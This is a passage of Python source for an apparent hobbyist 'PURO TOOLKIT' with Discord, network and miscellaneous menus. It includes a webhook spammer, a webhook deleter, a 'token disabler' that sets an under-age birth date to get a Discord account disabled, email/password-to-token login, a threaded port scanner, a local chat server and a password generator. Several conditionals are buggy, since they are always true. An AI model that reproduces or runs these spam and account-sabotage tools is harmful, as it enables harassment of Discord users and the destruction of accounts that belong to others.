            DiscordEmailToToken = input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Email: ')
            DiscordPasswordToToken= input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Password: ')
            data={'email': DiscordEmailToToken, 'password': DiscordPasswordToToken, 'undelete': 'false'}
            headers={'content-type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36'}
            r = requests.post('https://discord.com/api/v8/auth/login', json=data, headers=headers)
            if r.status_code == 200:
                token = r.json()['token']
                print(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Token: {token}')
                print(f'{Fore.BLUE}INFO |  {Fore.WHITE}Token generated')
            elif 'PASSWORD_DOES_NOT_MATCH' in r.text:
                print(f'{Fore.RED}ERROR | {Fore.WHITE}Invalid password')
            elif 'captcha-required' in r.text:
                print(f'{Fore.YELLOW}ERROR | {Fore.WHITE}Returned captcha')
            else:
                print(f'{Fore.RED}ERROR | {Fore.WHITE}Invalid email or password')
                input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Press Enter to return to Discord Menu')
                DiscordMenu()
        except ValueError as ValueErrorOutput:
            print(f'{Fore.RED}ERROR | {Fore.WHITE}Please enter a valid input ({ValueErrorOutput})')
        except KeyboardInterrupt:
            print(f'\n{Fore.BLUE}INFO | {Fore.WHITE}Keyboard Interrupt issued')
            input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Press Enter to return to Discord Menu')
            DiscordMenu()
        except Exception as ExceptionOutput:
            print(f'{Fore.RED}ERROR | {Fore.WHITE}Something went wrong ({ExceptionOutput})')
#Discord Menu - HalfToken
def DiscordUserIdToHalfToken():
    os.system(f'title PURO TOOLKIT {Version} - Discord Menu - Half Token from user ID')
    os.system('cls')
    print(F'{Style.BRIGHT}{Fore.BLACK}╔═══════════════════════════════════════════════════════╗')#------║
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╔═╗╦ ╦╦═╗╔═╗  ╔╦╗╔═╗╔═╗╦  ╦╔═╦╔╦╗           {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╠═╝║ ║╠╦╝║ ║   ║ ║ ║║ ║║  ╠╩╗║ ║            {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╩  ╚═╝╩╚═╚═╝   ╩ ╚═╝╚═╝╩═╝╩ ╩╩ ╩            {Fore.BLACK}║')
    print(F'{Fore.BLACK}╠═══════════════════════════════════════════════════════╣')#--------------------║
    print(F'{Fore.BLACK}║{Fore.WHITE} Discord Menu - User ID to Half Token                  {Fore.BLACK}║')
    print(F'{Fore.BLACK}╚═══════════════════════════════════════════════════════╝\n')#------------------║
    while True:
        try:
            DiscordUserIDtoHalfTokenUserID = input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}UserID: ')
            string_b = f'{DiscordUserIDtoHalfTokenUserID}'.encode('utf')
            bas64_bytes = base64.b64encode(string_b)
            HalfTokenGen = bas64_bytes.decode('utf-8')
            print(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Half Token: {HalfTokenGen}')
            print(f'{Fore.BLUE}INFO | {Fore.WHITE}Half token generated')
        except ValueError as ValueErrorOutput:
            print(f'{Fore.RED}ERROR | {Fore.WHITE}Please enter a valid input ({ValueErrorOutput})')
        except KeyboardInterrupt:
            print(f'\n{Fore.BLUE}INFO | {Fore.WHITE}Keyboard Interrupt issued')
            input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Press Enter to return to Discord Menu')
            DiscordMenu()
        except Exception as ExceptionOutput:
            print(f'{Fore.RED}ERROR | {Fore.WHITE}Something went wrong ({ExceptionOutput})')
#Discord Menu - WebHook Spammer
def DiscordWebhookSpammer():
    os.system(f'title PURO TOOLKIT {Version} - Discord Menu - Webhook Spammer')
    os.system('cls')
    
    print(F'{Style.BRIGHT}{Fore.BLACK}╔═══════════════════════════════════════════════════════╗')#------║
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╔═╗╦ ╦╦═╗╔═╗  ╔╦╗╔═╗╔═╗╦  ╦╔═╦╔╦╗           {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╠═╝║ ║╠╦╝║ ║   ║ ║ ║║ ║║  ╠╩╗║ ║            {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╩  ╚═╝╩╚═╚═╝   ╩ ╚═╝╚═╝╩═╝╩ ╩╩ ╩            {Fore.BLACK}║')
    print(F'{Fore.BLACK}╠═══════════════════════════════════════════════════════╣')#--------------------║
    print(F'{Fore.BLACK}║{Fore.WHITE} Discord Menu - Webhook Spammer                        {Fore.BLACK}║')
    print(F'{Fore.BLACK}╚═══════════════════════════════════════════════════════╝\n')#------------------║
    while True:
        try:
            DiscordWebhookSpammerWebhook = input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Webhook: ')
            DiscordWebhookSpammerMessage = input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Message: ')
            DiscordWebhookSpammerAmount = int(input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Amount: '))
            for i in range(DiscordWebhookSpammerAmount):
                _data = requests.post(DiscordWebhookSpammerWebhook, json={'content': DiscordWebhookSpammerMessage}, headers={'Content-Type': 'application/json'})
                if _data.status_code < 400:
                    print(f'{Fore.BLUE}INFO | {Fore.WHITE}Message sent')
                else:
                    print(f"{Fore.RED}ERROR | {Fore.WHITE}Message not sent")
            print(f'{Fore.BLUE}INFO |  {Fore.WHITE}Sent {DiscordWebhookSpammerAmount} messages')
        except ValueError as ValueErrorOutput:
            print(f'{Fore.RED}ERROR | {Fore.WHITE}Please enter a valid input ({ValueErrorOutput})')
        except KeyboardInterrupt:
            print(f'\n{Fore.BLUE}INFO | {Fore.WHITE}Keyboard Interrupt issued')
            input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Press Enter to return to Discord Menu')
            DiscordMenu()
        except Exception as ExceptionOutput:
            print(f'{Fore.RED}ERROR | {Fore.WHITE}Something went wrong ({ExceptionOutput})')
#Discord Menu - Webhook Deleter
def DiscordWebhookDeleter():
    os.system(f'title PURO TOOLKIT {Version} - Discord Menu - Webhook Deleter')
    os.system('cls')  
    print(F'{Style.BRIGHT}{Fore.BLACK}╔═══════════════════════════════════════════════════════╗')#------║
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╔═╗╦ ╦╦═╗╔═╗  ╔╦╗╔═╗╔═╗╦  ╦╔═╦╔╦╗           {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╠═╝║ ║╠╦╝║ ║   ║ ║ ║║ ║║  ╠╩╗║ ║            {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╩  ╚═╝╩╚═╚═╝   ╩ ╚═╝╚═╝╩═╝╩ ╩╩ ╩            {Fore.BLACK}║')
    print(F'{Fore.BLACK}╠═══════════════════════════════════════════════════════╣')#--------------------║
    print(F'{Fore.BLACK}║{Fore.WHITE} Discord Menu - Webhook Deleter                        {Fore.BLACK}║')
    print(F'{Fore.BLACK}╚═══════════════════════════════════════════════════════╝\n')#------------------║
    while True:
        try:
            DiscordWebhookDeleterWebhook = input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Webhook: ')
            requests.delete(DiscordWebhookDeleterWebhook.rstrip())
            print(f'{Fore.BLUE}INFO |  {Fore.WHITE}Webhook deleted')
        except ValueError as ValueErrorOutput:
            print(f'{Fore.RED}ERROR | {Fore.WHITE}Please enter a valid input ({ValueErrorOutput})')
        except KeyboardInterrupt:
            print(f'\n{Fore.BLUE}INFO | {Fore.WHITE}Keyboard Interrupt issued')
            input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Press Enter to return to Discord Menu')
            DiscordMenu()
        except Exception as ExceptionOutput:
            print(f'{Fore.RED}ERROR | {Fore.WHITE}Something went wrong ({ExceptionOutput})')
#Discord Menu - Change Hypesquad House
def DiscordHypesquadHouse():
    os.system(f'title PURO TOOLKIT {Version} - Discord Menu 2 - Hypesquad House')
    os.system('cls')
    print(F'{Style.BRIGHT}{Fore.BLACK}╔═══════════════════════════════════════════════════════╗')#------║
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╔═╗╦ ╦╦═╗╔═╗  ╔╦╗╔═╗╔═╗╦  ╦╔═╦╔╦╗           {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╠═╝║ ║╠╦╝║ ║   ║ ║ ║║ ║║  ╠╩╗║ ║            {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╩  ╚═╝╩╚═╚═╝   ╩ ╚═╝╚═╝╩═╝╩ ╩╩ ╩            {Fore.BLACK}║')
    print(F'{Fore.BLACK}╠═══════════════════════════════════════════════════════╣')#--------------------║
    print(F'{Fore.BLACK}║{Fore.WHITE} Discord Menu 2 - Hypesquad House                      {Fore.BLACK}║')
    print(F'{Fore.BLACK}╠═══════════════════════════════════════════════════════╣')#--------------------║
    print(F'{Fore.BLACK}║{Fore.WHITE} 1 | Bravery                                           {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE} 2 | Brilliance                                        {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE} 3 | Balance                                           {Fore.BLACK}║')
    print(F'{Fore.BLACK}╚═══════════════════════════════════════════════════════╝\n')#------------------║
    while True:
        try:
            DiscordHypesquadHouseHouse = int(input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Hypesquad House: '))
            DiscordHypesquadHouseToken = input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Token: ')
            headers = {'Authorization': DiscordHypesquadHouseToken, 'Content-Type': 'application/json'}  
            r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
            if r.status_code == 200:
                headers = {
                    'Authorization': DiscordHypesquadHouseToken,
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
                }
            if DiscordHypesquadHouseHouse == '1':
                payload = {'house_id': 1}
            elif DiscordHypesquadHouseHouse == '2':
                payload = {'house_id': 2}
            elif DiscordHypesquadHouseHouse == '3':
                payload = {'house_id': 3}
            r = requests.post('https://discordapp.com/api/v6/hypesquad/online', headers=headers, json=payload, timeout=10)
            if r.status_code == 204:
                print(f'{Fore.BLUE}INFO |  {Fore.WHITE}Hypesquad House changed')
        except ValueError as ValueErrorOutput:
            print(f'{Fore.RED}ERROR | {Fore.WHITE}Please enter a valid input ({ValueErrorOutput})')
        except KeyboardInterrupt:
            print(f'\n{Fore.BLUE}INFO | {Fore.WHITE}Keyboard Interrupt issued')
            input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Press Enter to return to Discord Menu 2')
            DiscordMenu2()
        except Exception as ExceptionOutput:
            print(f'{Fore.RED}ERROR | {Fore.WHITE}Something went wrong ({ExceptionOutput})')
#Discord Menu 2 - Disable Token
def DiscordTokenDisabler():
    os.system(f'title PURO TOOLKIT {Version} - Discord Menu 2 - Token Disabler')
    os.system('cls')
    
    print(F'{Style.BRIGHT}{Fore.BLACK}╔═══════════════════════════════════════════════════════╗')#------║
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╔═╗╦ ╦╦═╗╔═╗  ╔╦╗╔═╗╔═╗╦  ╦╔═╦╔╦╗           {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╠═╝║ ║╠╦╝║ ║   ║ ║ ║║ ║║  ╠╩╗║ ║            {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╩  ╚═╝╩╚═╚═╝   ╩ ╚═╝╚═╝╩═╝╩ ╩╩ ╩            {Fore.BLACK}║')
    print(F'{Fore.BLACK}╠═══════════════════════════════════════════════════════╣')#--------------------║
    print(F'{Fore.BLACK}║{Fore.WHITE} Discord Menu 2 - Token Disabler                       {Fore.BLACK}║')
    print(F'{Fore.BLACK}╚═══════════════════════════════════════════════════════╝\n')#------------------║
    while True:
        try:
            DiscordTokenDisablerToken = input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Token: ')
            headers = {'Authorization': DiscordTokenDisablerToken, 'Content-Type': 'application/json'}  
            r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
            if r.status_code == 200:
                r = requests.patch('https://discordapp.com/api/v8/users/@me', headers={'Authorization': DiscordTokenDisablerToken}, json={'date_of_birth': '2015-7-16'})
                if r.status_code == 400:
                    print(f'{Fore.BLUE}INFO |  {Fore.WHITE}Token disabled')
                else:
                    print(f'{Fore.RED}ERROR |  {Fore.WHITE}Invalid token')
            else:
                print(f'{Fore.RED}ERROR |  {Fore.WHITE}Invalid token')
        except ValueError as ValueErrorOutput:
            print(f'{Fore.RED}ERROR | {Fore.WHITE}Please enter a valid input ({ValueErrorOutput})')
        except KeyboardInterrupt:
            print(f'\n{Fore.BLUE}INFO | {Fore.WHITE}Keyboard Interrupt issued')
            input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Press Enter to return to Discord Menu 2')
            DiscordMenu2()
        except Exception as ExceptionOutput:
            print(f'{Fore.RED}ERROR | {Fore.WHITE}Something went wrong ({ExceptionOutput})')
#Network Menu - LocalChatServer
def NetworkLocalChatServer():
    os.system(f'title PURO TOOLKIT {Version} - Network Menu - Local Chat Server')
    os.system('cls')
    
    print(F'{Style.BRIGHT}{Fore.BLACK}╔═══════════════════════════════════════════════════════╗')#------║
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╔═╗╦ ╦╦═╗╔═╗  ╔╦╗╔═╗╔═╗╦  ╦╔═╦╔╦╗           {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╠═╝║ ║╠╦╝║ ║   ║ ║ ║║ ║║  ╠╩╗║ ║            {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╩  ╚═╝╩╚═╚═╝   ╩ ╚═╝╚═╝╩═╝╩ ╩╩ ╩            {Fore.BLACK}║')
    print(F'{Fore.BLACK}╠═══════════════════════════════════════════════════════╣')#--------------------║
    print(F'{Fore.BLACK}║{Fore.WHITE} Network Menu - Local Chat Server                      {Fore.BLACK}║')
    print(F'{Fore.BLACK}╚═══════════════════════════════════════════════════════╝\n')#------------------║
    while True:
        try:
            host = 'localhost'
            port = 55555
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.bind((host, port))
            server.listen()
            clients = []
            nicknames = []
            def broadcast(message):
                for client in clients:
                    client.send(message)
            def handle(client):
                while True:
                    try:
                        message = client.recv(1024)
                        broadcast(message)
                    except:
                        index = clients.index(client)
                        clients.remove(client)
                        client.close()
                        nickname = nicknames[index]
                        broadcast('{} left!'.format(nickname).encode('utf-8'))
                        nicknames.remove(nickname)
                        break
            def receive():
                while True:
                    client, address = server.accept()
                    print(f'{Fore.BLUE}INFO | {Fore.WHITE}Client Connection with {address}')
                    client.send('NICK'.encode('utf-8'))
                    nickname = client.recv(1024).decode('utf-8')
                    nicknames.append(nickname)
                    clients.append(client)
                    print(f'{Fore.BLUE}INFO | {Fore.WHITE}Client Username: {nickname}')
                    client.send(f'{Fore.BLUE}INFO | {Fore.WHITE}Connected to server!'.encode('utf-8'))
                    broadcast(f'{Fore.BLUE}INFO | {Fore.WHITE}{nickname} joined!'.encode('utf-8'))
                    thread = threading.Thread(target=handle, args=(client,))
                    thread.start()
            receive()
        except ValueError as ValueErrorOutput:
            print(f'{Fore.RED}ERROR | {Fore.WHITE}Please enter a valid input ({ValueErrorOutput})')
        except KeyboardInterrupt:
            print(f'\n{Fore.BLUE}INFO | {Fore.WHITE}Keyboard Interrupt issued')
            input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Press Enter to return to Network Menu')
            NetworkMenu()
        except Exception as ExceptionOutput:
            print(f'{Fore.RED}ERROR | {Fore.WHITE}Something went wrong ({ExceptionOutput})')
#Network Menu - LocalChatClient
def NetworkLocalChatClient():
    os.system(f'title PURO TOOLKIT {Version} - Network Menu - Local Chat Client')
    os.system('cls')
    print(F'{Style.BRIGHT}{Fore.BLACK}╔═══════════════════════════════════════════════════════╗')#------║
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╔═╗╦ ╦╦═╗╔═╗  ╔╦╗╔═╗╔═╗╦  ╦╔═╦╔╦╗           {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╠═╝║ ║╠╦╝║ ║   ║ ║ ║║ ║║  ╠╩╗║ ║            {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╩  ╚═╝╩╚═╚═╝   ╩ ╚═╝╚═╝╩═╝╩ ╩╩ ╩            {Fore.BLACK}║')
    print(F'{Fore.BLACK}╠═══════════════════════════════════════════════════════╣')#--------------------║
    print(F'{Fore.BLACK}║{Fore.WHITE} Network Menu - Local Chat Client                      {Fore.BLACK}║')
    print(F'{Fore.BLACK}╚═══════════════════════════════════════════════════════╝\n')#------------------║
    while True:
        try:
            NetworkLocalChatClientNickname = input(f"{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Username: ")
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect(('localhost', 55555))
            def receive():
                while True:
                    try:
                        message = client.recv(1024).decode('utf-8')
                        if message == 'NICK':
                            client.send(NetworkLocalChatClientNickname.encode('utf-8'))
                        else:
                            print(message)
                    except:
                        print(f"{Fore.RED}ERROR | {Fore.WHITE}An error ocurred")
                        client.close()
                        break
            def write():
                while True:
                    message = '{}{}: {}'.format(f"{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}", NetworkLocalChatClientNickname, input(''))
                    client.send(message.encode('utf-8'))
            receive_thread = threading.Thread(target=receive)
            receive_thread.start()
            write_thread = threading.Thread(target=write)
            write_thread.start()
            write()
        except ValueError as ValueErrorOutput:
            print(f'{Fore.RED}ERROR | {Fore.WHITE}Please enter a valid input ({ValueErrorOutput})')
        except ConnectionRefusedError as ConnectionRefusedErrorOutput:
            print(f'{Fore.RED}ERROR | {Fore.WHITE}There is not a server open ({ConnectionRefusedErrorOutput})')
        except KeyboardInterrupt:
            print(f'\n{Fore.BLUE}INFO | {Fore.WHITE}Keyboard Interrupt issued')
            input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Press Enter to return to Network Menu')
            NetworkMenu()
        except Exception as ExceptionOutput:
            print(f'{Fore.RED}ERROR | {Fore.WHITE}Something went wrong ({ExceptionOutput})')
#Network Menu - PortScanner
def NetworkPortScanner():
    os.system(f'title PURO TOOLKIT {Version} - Network Menu - Port Scanner')
    os.system('cls')
    print(F'{Style.BRIGHT}{Fore.BLACK}╔═══════════════════════════════════════════════════════╗')#------║
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╔═╗╦ ╦╦═╗╔═╗  ╔╦╗╔═╗╔═╗╦  ╦╔═╦╔╦╗           {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╠═╝║ ║╠╦╝║ ║   ║ ║ ║║ ║║  ╠╩╗║ ║            {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╩  ╚═╝╩╚═╚═╝   ╩ ╚═╝╚═╝╩═╝╩ ╩╩ ╩            {Fore.BLACK}║')
    print(F'{Fore.BLACK}╠═══════════════════════════════════════════════════════╣')#--------------------║
    print(f'{Fore.BLACK}║{Fore.WHITE} Network Menu - Port Scanner                           {Fore.BLACK}║')
    print(F'{Fore.BLACK}╚═══════════════════════════════════════════════════════╝\n')#------------------║
    while True:
        try:
            PortScannerIP = input(f"{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Target IP: ")
            while True:
                PortScannerMinPort = int(input(f"{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}From port (Min: 0): "))
                if PortScannerMinPort >= 0:
                    if PortScannerMinPort <= 65535:
                        break
            while True: 
                PortScannerMaxPort = int(input(f"{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}To port (Max: 65535): "))
                if PortScannerMaxPort <= 65535:
                    if PortScannerMaxPort >= 0:
                        break
            PortScannerTotalPorts = PortScannerMaxPort + 1 - PortScannerMinPort
            PortScannerClosed = input(f"{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Show Closed/Filtered ports? (Y/N): ")
            PortScannerMaxWorkers = int(input(f"{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Max Workers (Default: 100): "))
            PortScannerOpenPortsList = []
            print(f'{Fore.BLUE}INFO | {Fore.WHITE}Scanning Target {PortScannerIP}')
            def PortScannerScan(PortScannerIP, PortScannerPort):
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                    sock.settimeout(0.5)
                    result = sock.connect_ex((PortScannerIP, PortScannerPort))
    
                    if result == 0:
                        print(f"{Fore.GREEN}OPEN | {Fore.WHITE}{PortScannerPort}")
                        PortScannerOpenPortsList.append(f"{PortScannerPort}")
                    else:
                        if PortScannerClosed == "y" or "Y":
                            print(f"{Fore.RED}CLOSED/FILTERED | {Fore.WHITE}{PortScannerPort}")
            with concurrent.futures.ThreadPoolExecutor(max_workers=PortScannerMaxWorkers) as executor:
                for PortScannerPort in range(PortScannerMinPort, PortScannerMaxPort + 1):
                    executor.submit(PortScannerScan, PortScannerIP, PortScannerPort)
            print(f'{Fore.BLUE}INFO | {Fore.WHITE}Scanned {PortScannerTotalPorts} ports')
            print(f'{Fore.BLUE}INFO | {Fore.WHITE}Open Ports: {PortScannerOpenPortsList}')
        except ValueError as ValueErrorOutput:
            print(f'{Fore.RED}ERROR | {Fore.WHITE}Please enter a valid input ({ValueErrorOutput})')
        except KeyboardInterrupt:
            print(f'\n{Fore.BLUE}INFO | {Fore.WHITE}Keyboard Interrupt issued')
            input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Press Enter to return to Network Menu')
            NetworkMenu()
        except Exception as ExceptionOutput:
            print(f'{Fore.RED}ERROR | {Fore.WHITE}Something went wrong ({ExceptionOutput})')
#Miscellaneous Menu - Password Generator
def MiscellaneousPasswordGenerator():
    os.system(f'title PURO TOOLKIT {Version} - Miscellaneous Menu - Password Generator')
    os.system('cls')
    print(F'{Style.BRIGHT}{Fore.BLACK}╔═══════════════════════════════════════════════════════╗')#------║
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╔═╗╦ ╦╦═╗╔═╗  ╔╦╗╔═╗╔═╗╦  ╦╔═╦╔╦╗           {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╠═╝║ ║╠╦╝║ ║   ║ ║ ║║ ║║  ╠╩╗║ ║            {Fore.BLACK}║')
    print(F'{Fore.BLACK}║{Fore.WHITE}           ╩  ╚═╝╩╚═╚═╝   ╩ ╚═╝╚═╝╩═╝╩ ╩╩ ╩            {Fore.BLACK}║')
    print(F'{Fore.BLACK}╠═══════════════════════════════════════════════════════╣')#--------------------║
    print(f'{Fore.BLACK}║{Fore.WHITE} Miscellaneous Menu - Password Generator               {Fore.BLACK}║')
    print(F'{Fore.BLACK}╚═══════════════════════════════════════════════════════╝\n')#------------------║
    while True:
        try:
            MiscellaneousPasswordGeneratorAmount = int(input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Amount: '))
            MiscellaneousPasswordGeneratorLength = int(input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Length: '))
            MiscellaneousPasswordGeneratorDigits = input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Use digits? (Y/N): ')
            MiscellaneousPasswordGeneratorLowercaseLetters = input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Use lowercase letters? (Y/N): ')
            MiscellaneousPasswordGeneratorUppercaseLetters = input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Use uppercase letters? (Y/N): ')
            MiscellaneousPasswordGeneratorSpecialCharacters = input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Use special characters? (Y/N): ')
            MiscellaneousPasswordGeneratorSave = input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Save generated passwords in a file? (Y/N): ')
            MiscellaneousPasswordGeneratorCharacters = ""
            if MiscellaneousPasswordGeneratorDigits == "y" or "Y":
                MiscellaneousPasswordGeneratorCharacters += string.digits
            if MiscellaneousPasswordGeneratorLowercaseLetters == "y" or "Y":
                MiscellaneousPasswordGeneratorCharacters += string.ascii_lowercase
            if MiscellaneousPasswordGeneratorUppercaseLetters == "y" or "Y":
                MiscellaneousPasswordGeneratorCharacters += string.ascii_uppercase
            if MiscellaneousPasswordGeneratorSpecialCharacters == "y" or "Y":
                MiscellaneousPasswordGeneratorCharacters += string.punctuation
            if MiscellaneousPasswordGeneratorSave == "y" or "Y":
                MiscellaneousPasswordGeneratorFileName = input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}File Name (Without .txt): ')
                MiscellaneousPasswordGeneratorFile = open(f'{MiscellaneousPasswordGeneratorFileName}.txt', 'w')
                MiscellaneousPasswordGeneratorFile.write(f'{MiscellaneousPasswordGeneratorAmount} passwords with a length of {MiscellaneousPasswordGeneratorLength} characters | Generated with PuroToolKit')
            for i in range(MiscellaneousPasswordGeneratorAmount):
                password = ('').join(random.choices(MiscellaneousPasswordGeneratorCharacters, k=MiscellaneousPasswordGeneratorLength))
                print(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}{password}')
                if MiscellaneousPasswordGeneratorSave == "y" or "Y":
                    MiscellaneousPasswordGeneratorFile.write(f'\n{password}')
            if MiscellaneousPasswordGeneratorSave == "y" or "Y":
                MiscellaneousPasswordGeneratorFile.close()
            print(f'{Fore.BLUE}INFO | {Fore.WHITE}Generated {MiscellaneousPasswordGeneratorAmount} codes with a length of {MiscellaneousPasswordGeneratorLength} characters')
        except ValueError as ValueErrorOutput:
            print(f'{Fore.RED}ERROR | {Fore.WHITE}Please enter a valid input ({ValueErrorOutput})')
        except KeyboardInterrupt:
            print(f'\n{Fore.BLUE}INFO | {Fore.WHITE}Keyboard Interrupt issued')
            input(f'{Fore.BLACK}PURO TOOLKIT | {Fore.WHITE}Press Enter to return to Misc Menu')
            MiscMenu()
        except Exception as ExceptionOutput:
            print(f'{Fore.RED}ERROR | {Fore.WHITE}Something went wrong ({ExceptionOutput})')
MainMenu()
